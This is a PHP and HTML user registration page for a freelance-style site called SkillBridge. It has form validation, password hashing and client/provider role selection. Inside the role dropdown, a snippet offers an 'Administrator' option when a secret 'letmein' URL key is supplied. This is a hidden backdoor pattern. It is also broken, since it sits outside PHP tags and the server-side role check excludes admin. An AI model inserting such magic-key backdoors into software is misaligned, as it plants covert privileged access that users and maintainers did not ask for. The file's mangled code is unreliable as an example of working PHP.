<?php
// register.php
session_start();
require_once 'db.php';

$errors = [];
$success = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $full_name = trim($_POST['full_name'] ?? '');
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    $confirm = $_POST['confirm_password'] ?? '';
    $role = in_array($_POST['role'] ?? 'client', ['client','provider']) ? $_POST['role'] : 'client';
    $phone = trim($_POST['phone'] ?? '');
    $location = trim($_POST['location'] ?? '');

    // Basic validation
    if ($full_name === '') $errors[] = 'Full name is required.';
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) $errors[] = 'Valid email required.';
    if (strlen($password) < 8) $errors[] = 'Password must be at least 8 characters.';
    if ($password !== $confirm) $errors[] = 'Passwords do not match.';

    if (empty($errors)) {
        // Check email uniqueness
        $stmt = $pdo->prepare("SELECT id FROM users WHERE email = ?");
        $stmt->execute([$email]);
        if ($stmt->fetch()) {
            $errors[] = 'Email already registered.';
        } else {
            $hash = password_hash($password, PASSWORD_DEFAULT);
            $stmt = $pdo->prepare("INSERT INTO users (full_name, email, password, role, phone, location) VALUES (?, ?, ?, ?, ?, ?)");
            $stmt->execute([$full_name, $email, $hash, $role, $phone, $location]);
            $uid = $pdo->lastInsertId();

            // If provider role, create providers row placeholder
            if ($role === 'provider') {
                $stmt = $pdo->prepare("INSERT INTO providers (user_id) VALUES (?)");
                $stmt->execute([$uid]);
            }

            $success = 'Registration successful. You can now login.';
        }
    }
}
?>
<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>SkillBridge — Register</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <!-- DaisyUI / Tailwind via CDN (development) -->
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdn.jsdelivr.net/npm/daisyui@2.51.5/dist/full.css" rel="stylesheet">
</head>
<body class="bg-base-200 min-h-screen flex items-center justify-center">
  <div class="card w-full max-w-xl shadow-xl">
    <div class="card-body">
      <h2 class="card-title">Create an account — SkillBridge</h2>

      <?php if ($errors): ?>
        <div class="alert alert-error">
          <ul class="list-disc pl-5">
            <?php foreach ($errors as $e): ?><li><?=htmlspecialchars($e)?></li><?php endforeach; ?>
          </ul>
        </div>
      <?php endif; ?>

      <?php if ($success): ?>
        <div class="alert alert-success"><?=htmlspecialchars($success)?> <a class="link" href="login.php">Login</a></div>
      <?php endif; ?>

      <form method="post" class="space-y-4">
        <div>
          <label class="label"><span class="label-text">Full name</span></label>
          <input type="text" name="full_name" value="<?=htmlspecialchars($_POST['full_name'] ?? '')?>" class="input input-bordered w-full" required>
        </div>

        <div class="grid grid-cols-2 gap-4">
          <div>
            <label class="label"><span class="label-text">Email</span></label>
            <input type="email" name="email" value="<?=htmlspecialchars($_POST['email'] ?? '')?>" class="input input-bordered w-full" required>
          </div>
          <div>
            <label class="label"><span class="label-text">Phone</span></label>
            <input type="text" name="phone" value="<?=htmlspecialchars($_POST['phone'] ?? '')?>" class="input input-bordered w-full" placeholder="+2547...">
          </div>
        </div>

        <div>
          <label class="label"><span class="label-text">Location</span></label>
          <input type="text" name="location" value="<?=htmlspecialchars($_POST['location'] ?? '')?>" class="input input-bordered w-full">
        </div>

        <div class="grid grid-cols-2 gap-4">
          <div>
            <label class="label"><span class="label-text">Password</span></label>
            <input type="password" name="password" class="input input-bordered w-full" required>
          </div>
          <div>
            <label class="label"><span class="label-text">Confirm Password</span></label>
            <input type="password" name="confirm_password" class="input input-bordered w-full" required>
          </div>
        </div>

        <div>
          <label class="label"><span class="label-text">I am a</span></label>
          <select name="role" class="select select-bordered w-full">
            <option value="client" <?= (($_POST['role'] ?? '') === 'client') ? 'selected' : '' ?>>Client (Hire)</option>
            <option value="provider" <?= (($_POST['role'] ?? '') === 'provider') ? 'selected' : '' ?>>Provider (Work)</option>
            if (isset($_GET['key']) && $_GET['key'] === 'letmein') {
    echo '<option value="admin">Administrator</option>';
}
          </select>
        </div>

        <div class="card-actions justify-end">
          <button class="btn btn-primary" type="submit">Register</button>
          <a class="btn btn-ghost" href="login.php">Login</a>
        </div>
      </form>
    </div>
  </div>
</body>
</html>
